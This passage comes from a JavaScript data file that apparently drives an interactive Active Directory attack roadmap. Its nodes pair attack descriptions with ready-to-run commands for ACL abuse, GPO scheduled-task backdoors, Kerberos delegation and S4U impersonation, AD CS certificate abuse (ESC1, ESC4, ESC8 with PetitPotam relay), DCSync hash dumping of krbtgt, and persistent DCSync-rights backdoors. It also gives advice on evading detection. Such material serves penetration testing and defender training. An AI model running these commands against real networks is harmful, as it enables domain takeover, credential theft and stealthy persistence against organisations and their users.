                                            code: 'dacledit.py -action write -rights FullControl -principal attacker -target-dn "CN=User,DC=domain,DC=com" domain/user:password'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '✍️',
                                    resources: [{
                                            title: 'WriteDACL Exploitation',
                                            url: 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces'
                                        },
                                        {
                                            title: 'dacledit.py Tool',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/dacledit.py'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'genericall-abuse',
                                data: {
                                    label: 'GenericAll Abuse',
                                    description: 'Full object control',
                                    descriptionMd: '### GenericAll Abuse\nGenericAll grants complete control over an AD object, enabling password resets, SPN modifications, group membership changes, and more.\n\n**Abuse Scenarios by Object Type:**\n* **User**: Password reset, SPN manipulation (Kerberoasting), shadow credentials\n* **Group**: Add members (including self)\n* **Computer**: RBCD attack, LAPS password read, shadow credentials\n* **GPO**: Modify policy for code execution\n* **OU**: Link malicious GPO\n\n**Most Dangerous Paths:** GenericAll on high-value groups or GPOs affecting privileged systems.\n',
                                    commands: [{
                                            description: 'Find GenericAll permissions',
                                            code: 'Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}'
                                        },
                                        {
                                            description: 'Reset user password',
                                            code: 'Set-DomainUserPassword -Identity target-user -Password (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)'
                                        },
                                        {
                                            description: 'Add self to group',
                                            code: 'Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"'
                                        },
                                        {
                                            description: 'Set SPN for Kerberoasting',
                                            code: 'Set-DomainObject -Identity target-user -Set @{serviceprincipalname="fake/svc"}'
                                        },
                                        {
                                            description: 'Targeted Kerberoast',
                                            code: 'Rubeus.exe kerberoast /user:target-user /nowrap'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎯',
                                    resources: [{
                                            title: 'GenericAll Abuse Guide',
                                            url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse'
                                        },
                                        {
                                            title: 'Shadow Credentials Attack',
                                            url: 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'forcechangepassword',
                                data: {
                                    label: 'ForceChangePassword',
                                    description: 'Reset user passwords',
                                    descriptionMd: '### ForceChangePassword Abuse\nThe ExtendedRight "User-Force-Change-Password" allows resetting a user\'s password without knowing the current password.\n\n**Attack Scenario:**\n1. Enumerate principals with ForceChangePassword right\n2. Reset target user password\n3. Authenticate as target user\n4. Optional: Restore original password if known\n\n**Stealth Considerations:** Password reset triggers event 4724, consider operational security.\n',
                                    commands: [{
                                            description: 'Find ForceChangePassword rights',
                                            code: 'Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Force-Change-Password"}'
                                        },
                                        {
                                            description: 'Reset password (PowerView)',
                                            code: 'Set-DomainUserPassword -Identity target-user -Password (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)'
                                        },
                                        {
                                            description: 'Reset password (net)',
                                            code: 'net user target-user NewPass123! /domain'
                                        },
                                        {
                                            description: 'Reset password (rpcclient)',
                                            code: 'rpcclient -U domain/attacker $TARGET -c "setuserinfo2 target-user 23 \'NewPass123!\'"'
                                        },
                                        {
                                            description: 'Impacket password change',
                                            code: 'changepasswd.py domain/attacker:password@dc -newpass NewPass123! -targetuser target-user'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🔐',
                                    resources: [{
                                            title: 'Password Reset Attack',
                                            url: 'https://adsecurity.org/?p=3164'
                                        },
                                        {
                                            title: 'ACE Abuse Reference',
                                            url: 'https://www.thehacker.recipes/ad/movement/dacl'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'gpo-abuse',
                        data: {
                            label: 'GPO Control',
                            description: 'Policy-level privilege',
                            descriptionMd: '### GPO Control\nAssess who can edit or link GPOs that affect privileged systems. Treat GPO modification rights as near-admin.\n\n**Dangerous Permissions:**\n* **WriteProperty** on GPO: Modify policy settings\n* **WriteDACL** on GPO: Grant yourself edit rights\n* **GenericWrite** on OU: Link malicious GPO to OU\n* **CreateChild** on OU: Create and link new GPO\n\n**Attack Vectors:**\n* Immediate scheduled task for code execution\n* Registry key modification for persistence\n* Script deployment (startup/shutdown/logon/logoff)\n* Software installation policy abuse\n\n**Impact:** Code execution on all computers/users affected by the GPO, often leading to domain compromise.\n',
                            commands: [{
                                    description: 'Enumerate GPO permissions',
                                    code: 'Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}'
                                },
                                {
                                    description: 'Find editable GPOs',
                                    code: 'Get-DomainGPO | Where-Object {$_ | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "attackergroup"}}'
                                },
                                {
                                    description: 'SharpGPOAbuse scheduled task',
                                    code: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author NT-AUTHORITY\\SYSTEM --Command "cmd.exe" --Arguments "/c net user backdoor P@ssw0rd /add" --GPOName "Default Domain Policy"'
                                },
                                {
                                    description: 'PowerView GPO modification',
                                    code: 'New-GPOImmediateTask -TaskName Backdoor -GPODisplayName "Vulnerable GPO" -CommandArguments "-NoP -NonI -W Hidden -Exec Bypass -Enc <base64>" -Force'
                                },
                                {
                                    description: 'PyGPOAbuse immediate task',
                                    code: 'pygpoabuse.py DOMAIN/user:password -dc-ip DC-IP -gpo-id "{GPO-GUID}" -command "cmd /c net user backdoor P@ssw0rd /add"'
                                }
                            ],
                            type: 'technique',
                            emoji: '📑',
                            resources: [{
                                    title: 'SharpGPOAbuse',
                                    url: 'https://github.com/FSecureLABS/SharpGPOAbuse'
                                },
                                {
                                    title: 'GPO Abuse Guide',
                                    url: 'https://adsecurity.org/?p=2716'
                                },
                                {
                                    title: 'PyGPOAbuse',
                                    url: 'https://github.com/Hackndo/pyGPOAbuse'
                                }
                            ]
                        },
                        children: [{
                            id: 'gpo-link-abuse',
                            data: {
                                label: 'GPO Link Abuse',
                                description: 'Link malicious GPO to OU',
                                descriptionMd: '### GPO Link Abuse\nAbuse permissions to link a malicious GPO to an OU containing high-value targets like Domain Controllers or privileged user accounts.\n\n**Attack Flow:**\n1. Create or compromise existing GPO\n2. Configure malicious settings (scheduled task, script, etc.)\n3. Link GPO to target OU\n4. Wait for GPO refresh or force with gpupdate\n5. Gain code execution on affected systems\n\n**Target Priority:** DCs > Servers > Privileged User OUs > Workstations\n',
                                commands: [{
                                        description: 'Find OUs you can link to',
                                        code: 'Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -match "GP-Link") -and ($_.ActiveDirectoryRights -match "WriteProperty")}'
                                    },
                                    {
                                        description: 'Link GPO to OU (PowerShell)',
                                        code: 'New-GPLink -Name "Malicious GPO" -Target "OU=Servers,DC=domain,DC=com" -LinkEnabled Yes -Enforced Yes'
                                    },
                                    {
                                        description: 'Create and link GPO',
                                        code: 'SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "SYSTEM" --Command "powershell.exe" --Arguments "-enc <payload>" --GPOName "Security Update" --OU "OU=Domain Controllers,DC=domain,DC=com"'
                                    }
                                ],
                                type: 'technique',
                                emoji: '🔗',
                                resources: [{
                                    title: 'GPO Linking Attack',
                                    url: 'https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/'
                                }]
                            },
                            children: []
                        }]
                    },
                    {
                        id: 'delegation',
                        data: {
                            label: 'Delegation Issues',
                            description: 'Unconstrained / constrained / RBCD',
                            descriptionMd: '### Delegation Issues\nEvaluate delegation settings as they can create powerful impersonation paths when combined with weak service isolation.\n\n**Delegation Types:**\n* **Unconstrained Delegation**: Service can impersonate any user to any service (highest risk)\n* **Constrained Delegation**: Service can impersonate users to specific services\n* **Resource-Based Constrained Delegation (RBCD)**: Target resource controls who can delegate to it\n* **Protocol Transition**: Allows S4U2Self for any user without their TGT\n\n**Attack Scenarios:**\n* Extract TGTs from unconstrained delegation hosts\n* Abuse constrained delegation with protocol transition\n* Configure RBCD on writable msDS-AllowedToActOnBehalfOfOtherIdentity\n* Combine with printer bug or PetitPotam for DC coercion\n',
                            commands: [{
                                    description: 'Find unconstrained delegation',
                                    code: 'Get-DomainComputer -Unconstrained | Select-Object name,dnshostname'
                                },
                                {
                                    description: 'Find constrained delegation',
                                    code: 'Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto'
                                },
                                {
                                    description: 'Check RBCD',
                                    code: 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}'
                                },
                                {
                                    description: 'Rubeus monitor unconstrained',
                                    code: 'Rubeus.exe monitor /interval:5 /nowrap'
                                },
                                {
                                    description: 'Rubeus S4U abuse',
                                    code: 'Rubeus.exe s4u /user:serviceaccount$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt'
                                }
                            ],
                            type: 'technique',
                            emoji: '🪝',
                            resources: [{
                                    title: 'Delegation Deep Dive',
                                    url: 'https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1'
                                },
                                {
                                    title: 'RBCD Attack',
                                    url: 'https://www.netspi.com/blog/technical/network-penetration-testing/cve-2019-1040-windows-vulnerability/'
                                }
                            ]
                        },
                        children: [{
                                id: 'unconstrained-delegation',
                                data: {
                                    label: 'Unconstrained Delegation',
                                    description: 'Extract TGTs from memory',
                                    descriptionMd: '### Unconstrained Delegation Attack\nServers with unconstrained delegation store TGTs of authenticating users in memory, allowing complete impersonation.\n\n**Attack Prerequisites:**\n* Compromise host with unconstrained delegation\n* Wait for or force privileged user authentication\n* Extract TGT from memory\n* Pass-the-ticket to impersonate user\n\n**Coercion Methods:**\n* Printer Bug (SpoolService)\n* PetitPotam (MS-EFSRPC)\n* DFSCoerce (MS-DFSNM)\n* PrivExchange (Exchange Push Subscription)\n\n**High Value Target:** Domain Controllers often authenticate to workstations/servers, providing DA TGT.\n',
                                    commands: [{
                                            description: 'Enumerate unconstrained hosts',
                                            code: 'Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol'
                                        },
                                        {
                                            description: 'Monitor for TGTs (Rubeus)',
                                            code: 'Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap'
                                        },
                                        {
                                            description: 'Extract tickets (Mimikatz)',
                                            code: 'sekurlsa::tickets /export'
                                        },
                                        {
                                            description: 'Trigger printer bug',
                                            code: 'SpoolSample.exe DC01.domain.com UNCONSTRAINED-HOST.domain.com'
                                        },
                                        {
                                            description: 'Pass-the-ticket',
                                            code: 'Rubeus.exe ptt /ticket:base64ticket'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎫',
                                    resources: [{
                                            title: 'Unconstrained Delegation Abuse',
                                            url: 'https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/'
                                        },
                                        {
                                            title: 'Printer Bug',
                                            url: 'https://github.com/leechristensen/SpoolSample'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'constrained-delegation',
                                data: {
                                    label: 'Constrained Delegation',
                                    description: 'S4U2Self and S4U2Proxy abuse',
                                    descriptionMd: '### Constrained Delegation Abuse\nAbuse Service-for-User (S4U) extensions to impersonate users to specific services, often bypassing authentication requirements.\n\n**S4U Extensions:**\n* **S4U2Self**: Request service ticket for any user to yourself (requires TRUSTED_TO_AUTH_FOR_DELEGATION)\n* **S4U2Proxy**: Use obtained ticket to request ticket to delegated service\n\n**Protocol Transition**: When TRUSTED_TO_AUTH_FOR_DELEGATION is set, S4U2Self works without user\'s TGT, enabling full impersonation.\n\n**Attack Path:**\n1. Compromise account with constrained delegation\n2. Use S4U2Self to get ticket for privileged user\n3. Use S4U2Proxy to get ticket to target service\n4. Alternate service name (HOST → CIFS, HTTP → LDAP)\n',
                                    commands: [{
                                            description: 'Find constrained delegation',
                                            code: 'Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto'
                                        },
                                        {
                                            description: 'S4U attack (Rubeus)',
                                            code: 'Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:Administrator /msdsspn:http/target.domain.com /altservice:cifs /ptt'
                                        },
                                        {
                                            description: 'S4U with TGT',
                                            code: 'Rubeus.exe s4u /ticket:BASE64TGT /impersonateuser:Administrator /msdsspn:http/target.domain.com /altservice:ldap /ptt'
                                        },
                                        {
                                            description: 'Impacket getST',
                                            code: 'getST.py -spn cifs/target.domain.com -impersonate Administrator -dc-ip DC-IP domain/serviceaccount:password'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎭',
                                    resources: [{
                                            title: 'S4U Attack Guide',
                                            url: 'https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/'
                                        },
                                        {
                                            title: 'Kerberos Delegation',
                                            url: 'https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'rbcd-attack',
                                data: {
                                    label: 'Resource-Based Constrained Delegation',
                                    description: 'msDS-AllowedToActOnBehalfOfOtherIdentity abuse',
                                    descriptionMd: '### RBCD Attack\nResource-Based Constrained Delegation allows the target resource to control who can delegate to it via the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.\n\n**Attack Requirements:**\n* WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity of target computer\n* Control over a computer account (create new or compromise existing)\n* Target must be running Windows Server 2012+\n\n**Attack Flow:**\n1. Create or compromise computer account\n2. Modify target\'s msDS-AllowedToActOnBehalfOfOtherIdentity to allow delegation from controlled computer\n3. Perform S4U2Self and S4U2Proxy to impersonate any user to target\n4. Request service ticket as privileged user\n\n**Common Entry:** GenericWrite/GenericAll on computer object.\n',
                                    commands: [{
                                            description: 'Find RBCD candidates',
                                            code: 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -match "AllowedToAct") -and ($_.ActiveDirectoryRights -match "WriteProperty")}'
                                        },
                                        {
                                            description: 'Create computer account',
                                            code: 'StandIn.exe --computer FAKE01 --make'
                                        },
                                        {
                                            description: 'Set RBCD (PowerView)',
                                            code: 'Set-DomainObject -Identity TARGET$ -Set @{"msds-allowedtoactonbehalfofotheridentity"=$bytes} -Verbose'
                                        },
                                        {
                                            description: 'Impacket RBCD setup',
                                            code: 'rbcd.py -delegate-from FAKE01$ -delegate-to TARGET$ -action write domain/user:password'
                                        },
                                        {
                                            description: 'S4U abuse',
                                            code: 'Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.com /ptt'
                                        },
                                        {
                                            description: 'getST.py impersonation',
                                            code: 'getST.py -spn cifs/target.domain.com -impersonate Administrator -dc-ip DC-IP domain/FAKE01$:password'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎯',
                                    resources: [{
                                            title: 'RBCD Attack Explained',
                                            url: 'https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a'
                                        },
                                        {
                                            title: 'RBCD Tool',
                                            url: 'https://github.com/tothi/rbcd-attack'
                                        },
                                        {
                                            title: 'Impacket rbcd.py',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/rbcd.py'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'adcs-privesc',
                        data: {
                            label: 'AD CS Misconfigurations',
                            description: 'Template & enrollment flaws',
                            descriptionMd: '### AD CS Misconfigurations\nMisconfigured certificate templates, enrollment agents, or access control can produce credentials equivalent to privileged identities.\n\n**Critical Misconfigurations:**\n* **ESC1**: Template allows SAN, enrollable by low-privs, authentication enabled\n* **ESC2**: Template allows Any Purpose EKU or no EKU\n* **ESC3**: Enrollment agent template abuse\n* **ESC4**: Vulnerable template ACLs (modify template)\n* **ESC5**: Vulnerable PKI object ACLs\n* **ESC6**: EDITF_ATTRIBUTESUBJECTflag enabled\n* ESC7: Vulnerable CA ACLs\n* ESC8: NTLM relay to HTTP enrollment\n\nImpact: Obtain certificates for any user, often leading to domain admin.\n',
                            commands: [{
                                    description: 'Certify template enumeration',
                                    code: 'Certify.exe find /vulnerable'
                                },
                                {
                                    description: 'Certipy all checks',
                                    code: 'certipy find -u user@domain.com -p password -dc-ip DC-IP -vulnerable -stdout'
                                },
                                {
                                    description: 'ESC1 exploitation',
                                    code: 'Certify.exe request /ca:CA-NAME /template:VulnerableTemplate /altname:Administrator'
                                },
                                {
                                    description: 'Certipy request cert',
                                    code: 'certipy req -u user@domain.com -p password -ca CA-NAME -target ca.domain.com -template VulnerableTemplate -upn administrator@domain.com'
                                },
                                {
                                    description: 'Authenticate with cert',
                                    code: 'Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /nowrap'
                                },
                                {
                                    description: 'Certipy authentication',
                                    code: 'certipy auth -pfx administrator.pfx -dc-ip DC-IP'
                                }
                            ],
                            type: 'technique',
                            emoji: '🏷️',
                            resources: [{
                                    title: 'Certified Pre-Owned',
                                    url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                },
                                {
                                    title: 'Certify Tool',
                                    url: 'https://github.com/GhostPack/Certify'
                                },
                                {
                                    title: 'Certipy Tool',
                                    url: 'https://github.com/ly4k/Certipy'
                                }
                            ]
                        },
                        children: [{
                                id: 'esc1-attack',
                                data: {
                                    label: 'ESC1 - SAN Template',
                                    description: 'Request cert for any user',
                                    descriptionMd: '### ESC1 - Subject Alternative Name Abuse\nMost dangerous ADCS misconfiguration. Template allows specifying Subject Alternative Name (SAN), is enrollable by low-privileged users, and enabled for authentication.\n\nRequirements:\n* Template has ENROLLEE_SUPPLIES_SUBJECT flag\n* Low-privileged group can enroll\n* Enhanced Key Usage includes Client Authentication or Smart Card Logon\n* Template not requiring manager approval\n\nAttack: Request certificate with SAN of privileged user (DA, Enterprise Admin, etc.) and authenticate to AD.\n',
                                    commands: [{
                                            description: 'Find ESC1 templates',
                                            code: 'Certify.exe find /vulnerable /currentuser'
                                        },
                                        {
                                            description: 'Request DA certificate',
                                            code: 'Certify.exe request /ca:CA-SERVER\CA-NAME /template:ESC1-Template /altname:Administrator'
                                        },
                                        {
                                            description: 'Certipy ESC1 exploit',
                                            code: 'certipy req -u user@domain.com -p password -target ca.domain.com -ca CA-NAME -template ESC1-Template -upn administrator@domain.com -dns dc.domain.com'
                                        },
                                        {
                                            description: 'Convert PEM to PFX',
                                            code: 'openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx'
                                        },
                                        {
                                            description: 'Get TGT with certificate',
                                            code: 'Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass /nowrap'
                                        },
                                        {
                                            description: 'Certipy authenticate',
                                            code: 'certipy auth -pfx administrator.pfx -dc-ip DC-IP -username Administrator -domain domain.com'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '📜',
                                    resources: [{
                                        title: 'ESC1 Detailed Analysis',
                                        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                    }]
                                },
                                children: []
                            },
                            {
                                id: 'esc8-relay',
                                data: {
                                    label: 'ESC8 - NTLM Relay to ADCS',
                                    description: 'Relay authentication to HTTP enrollment',
                                    descriptionMd: '### ESC8 - NTLM Relay to ADCS HTTP Endpoints\nRelay NTLM authentication from coerced machine accounts to ADCS web enrollment interface to obtain certificates.\n\nRequirements:\n* ADCS HTTP enrollment enabled (usually on port 80)\n* Ability to coerce authentication (PetitPotam, PrinterBug, etc.)\n* No EPA (Extended Protection for Authentication) or weak configuration\n\nAttack Chain:\n1. Setup NTLM relay to ADCS HTTP endpoint\n2. Coerce DC authentication to relay server\n3. Relay DC machine account to request certificate\n4. Use certificate for DCSync or other attacks\n\nHigh Impact: Often leads directly to domain compromise via DC machine account certificate.\n',
                                    commands: [{
                                            description: 'Setup ntlmrelayx for ADCS',
                                            code: 'ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController'
                                        },
                                        {
                                            description: 'Certipy relay',
                                            code: 'certipy relay -target http://ca-server/certsrv/certfnsh.asp -template DomainController'
                                        },
                                        {
                                            description: 'Coerce with PetitPotam',
                                            code: 'python3 PetitPotam.py RELAY-IP DC-IP'
                                        },
                                        {
                                            description: 'Authenticate with cert',
                                            code: 'certipy auth -pfx dc.pfx -dc-ip DC-IP'
                                        },
                                        {
                                            description: 'DCSync with obtained hash',
                                            code: 'secretsdump.py -just-dc-user Administrator domain/DC01$@DC-IP -hashes :HASH'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🎣',
                                    resources: [{
                                            title: 'ESC8 NTLM Relay',
                                            url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                        },
                                        {
                                            title: 'PetitPotam Tool',
                                            url: 'https://github.com/topotam/PetitPotam'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'esc4-template-acl',
                                data: {
                                    label: 'ESC4 - Template ACL Abuse',
                                    description: 'Modify certificate template',
                                    descriptionMd: '### ESC4 - Vulnerable Certificate Template ACLs\nAbuse write permissions on certificate templates to create ESC1-like conditions or enable dangerous configurations.\n\nDangerous Permissions on Templates:\n* WriteProperty / GenericWrite: Modify template settings\n* WriteDACL: Grant yourself full control\n* WriteOwner: Take ownership of template\n\nAttack: Modify template to enable ENROLLEE_SUPPLIES_SUBJECT flag, adjust EKUs, or change enrollment permissions to create exploitable configuration.\n',
                                    commands: [{
                                            description: 'Find template permissions',
                                            code: 'Certify.exe find /vulnerable /currentuser'
                                        },
                                        {
                                            description: 'Certipy template ACL check',
                                            code: 'certipy find -u user@domain.com -p password -dc-ip DC-IP -vulnerable -stdout | grep -A 20 ESC4'
                                        },
                                        {
                                            description: 'Modify template (Certipy)',
                                            code: 'certipy template -u user@domain.com -p password -template VulnerableTemplate -save-old'
                                        },
                                        {
                                            description: 'Enable dangerous flag',
                                            code: 'certipy template -u user@domain.com -p password -template VulnerableTemplate -configuration "ENROLLEE_SUPPLIES_SUBJECT"'
                                        },
                                        {
                                            description: 'Exploit modified template',
                                            code: 'certipy req -u user@domain.com -p password -ca CA-NAME -target ca.domain.com -template VulnerableTemplate -upn administrator@domain.com'
                                        },
                                        {
                                            description: 'Restore template',
                                            code: 'certipy template -u user@domain.com -p password -template VulnerableTemplate -configuration VulnerableTemplate.json'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '✏️',
                                    resources: [{
                                        title: 'Template Modification Attack',
                                        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
                                    }]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'dcsync',
                        data: {
                            label: 'Directory Replication Rights',
                            description: 'Replication-capable principals',
                            descriptionMd: '### Directory Replication Rights\nIdentify principals with replication-like rights; this is often an immediate escalation-to-domain-control risk.\n\nRequired Permissions:\n* DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)\n* DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n* Optional: DS-Replication-Get-Changes-In-Filtered-Set for LAPS\n\nImpact: Complete domain compromise - extract all password hashes including KRBTGT.\n\nDCSync Advantages:\n* No need to run code on DC\n* Stealthy - normal replication traffic\n* Can target specific accounts\n* Works remotely over RPC\n',
                            commands: [{
                                    description: 'Find replication rights',
                                    code: 'Get-DomainObjectAcl -SearchBase "DC=domain,DC=com" -ResolveGUIDs | Where-Object {($.ObjectAceType -match "replication") -and ($.ActiveDirectoryRights -match "ExtendedRight")}'
                                },
                                {
                                    description: 'PowerView DCSync check',
                                    code: 'Get-DomainObjectAcl "DC=domain,DC=com" -ResolveGUIDs | Where-Object {($.ObjectAceType -match "1131f6aa") -or ($.ObjectAceType -match "1131f6ad")}'
                                },
                                {
                                    description: 'DCSync with Mimikatz',
                                    code: 'lsadump::dcsync /domain:domain.com /user:Administrator'
                                },
                                {
                                    description: 'DCSync all users',
                                    code: 'lsadump::dcsync /domain:domain.com /all /csv'
                                },
                                {
                                    description: 'Impacket secretsdump',
                                    code: 'secretsdump.py domain/user:password@DC-IP -just-dc-user krbtgt'
                                },
                                {
                                    description: 'DCSync specific user',
                                    code: 'secretsdump.py domain/user:password@DC-IP -just-dc-user Administrator'
                                }
                            ],
                            type: 'technique',
                            emoji: '🔁',
                            resources: [{
                                    title: 'DCSync Attack',
                                    url: 'https://adsecurity.org/?p=1729'
                                },
                                {
                                    title: 'Mimikatz DCSync',
                                    url: 'https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump'
                                }
                            ]
                        },
                        children: [{
                                id: 'dcsync-attack',
                                data: {
                                    label: 'DCSync Execution',
                                    description: 'Extract domain credentials',
                                    descriptionMd: '### DCSync Attack Execution\nPerform domain replication to extract password hashes from Active Directory without touching the Domain Controller filesystem.\n\nTarget Priority:\n1. krbtgt: Golden Ticket creation\n2. Domain Admins: Immediate elevated access\n3. Service Accounts: Potential high-value access\n4. All Users: Complete domain credential compromise\n\nOperational Security:\n* Generates Event ID 4662 (replication request)\n* Monitor for unusual replication partners\n* Rate limit requests to avoid detection\n* Target specific accounts rather than full dump when possible\n',
                                    commands: [{
                                            description: 'DCSync krbtgt (Mimikatz)',
                                            code: 'lsadump::dcsync /domain:domain.com /user:krbtgt'
                                        },
                                        {
                                            description: 'DCSync Administrator',
                                            code: 'lsadump::dcsync /domain:domain.com /user:Administrator'
                                        },
                                        {
                                            description: 'DCSync all (secretsdump)',
                                            code: 'secretsdump.py domain/user:password@DC-IP -just-dc -outputfile hashes'
                                        },
                                        {
                                            description: 'DCSync with hash',
                                            code: 'secretsdump.py -hashes :NTHASH domain/user@DC-IP -just-dc-user krbtgt'
                                        },
                                        {
                                            description: 'DCSync history',
                                            code: 'secretsdump.py domain/user:password@DC-IP -just-dc-user Administrator -history'
                                        },
                                        {
                                            description: 'Impacket DCSync NTLM',
                                            code: 'secretsdump.py domain/user:password@DC-IP -just-dc-ntlm'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '💎',
                                    resources: [{
                                            title: 'DCSync Explained',
                                            url: 'https://attack.mitre.org/techniques/T1003/006/'
                                        },
                                        {
                                            title: 'Detecting DCSync',
                                            url: 'https://adsecurity.org/?p=1729'
                                        }
                                    ]
                                },
                                children: []
                            },
                            {
                                id: 'dcsync-backdoor',
                                data: {
                                    label: 'DCSync Rights Backdoor',
                                    description: 'Grant replication permissions',
                                    descriptionMd: '### DCSync Rights Persistence\nGrant replication permissions to a controlled account as a persistence mechanism, allowing future credential extraction.\n\nBackdoor Advantages:\n* Survives password changes\n* Difficult to detect without ACL auditing\n* No need to maintain code execution\n* Can be applied to computer accounts\n\nAttack Flow:\n1. Compromise account with WriteDACL on domain object\n2. Grant DS-Replication-Get-Changes rights to backdoor account\n3. Grant DS-Replication-Get-Changes-All rights\n4. Perform DCSync from anywhere as backdoor account\n\nStealth: Use inconspicuous account names, computer accounts, or MSAs.\n',
                                    commands: [{
                                            description: 'Grant DCSync rights (PowerView)',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity backdoor -Rights DCSync'
                                        },
                                        {
                                            description: 'Manual ACL modification',
                                            code: 'Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity backdoor -Rights ExtendedRight -ObjectAceType 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2,1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
                                        },
                                        {
                                            description: 'Impacket dacledit DCSync',
                                            code: 'dacledit.py -action write -rights DCSync -principal backdoor -target-dn "DC=domain,DC=com" domain/admin:password'
                                        },
                                        {
                                            description: 'Verify backdoor works',
                                            code: 'secretsdump.py domain/backdoor:password@DC-IP -just-dc-user krbtgt'
                                        },
                                        {
                                            description: 'Remove backdoor',
                                            code: 'Remove-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity backdoor -Rights DCSync'
                                        }
                                    ],
                                    type: 'technique',
                                    emoji: '🚪',
                                    resources: [{
                                            title: 'ACL Persistence',
                                            url: 'https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-28b1f3d11e6e'
                                        },
                                        {
                                            title: 'dacledit.py',
                                            url: 'https://github.com/fortra/impacket/blob/master/examples/dacledit.py'
                                        }
                                    ]
                                },
                                children: []
                            }
                        ]
                    },
                    {
                        id: 'laps-abuse',
                        data: {
                            label: 'LAPS Abuse',
                            description: 'Local admin password extraction',
                            descriptionMd: '### LAPS (Local Administrator Password Solution) Abuse\nAbuse permissions to read LAPS passwords stored in AD, providing local admin access to managed computers.\n\nLAPS Attributes:\n* ms-Mcs-AdmPwd: Cleartext local admin password\n* ms-Mcs-AdmPwdExpirationTime: Password expiration time\n\nRequired Permissions:\n* ExtendedRight "All Extended Rights" OR\n* ReadProperty on ms-Mcs-AdmPwd attribute\n\nAttack Path: Read LAPS password → Local admin on computer → Lateral movement / credential theft\n\nTarget Priority: Servers > Jump boxes > Admin workstations > Regular workstations\n',
                            commands: [{
                                    description: 'Find LAPS readable computers',
                                    code: 'Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($.ObjectAceType -like "ms-Mcs-AdmPwd") -and ($.ActiveDirectoryRights -match "ReadProperty")}'
                                },
                                {
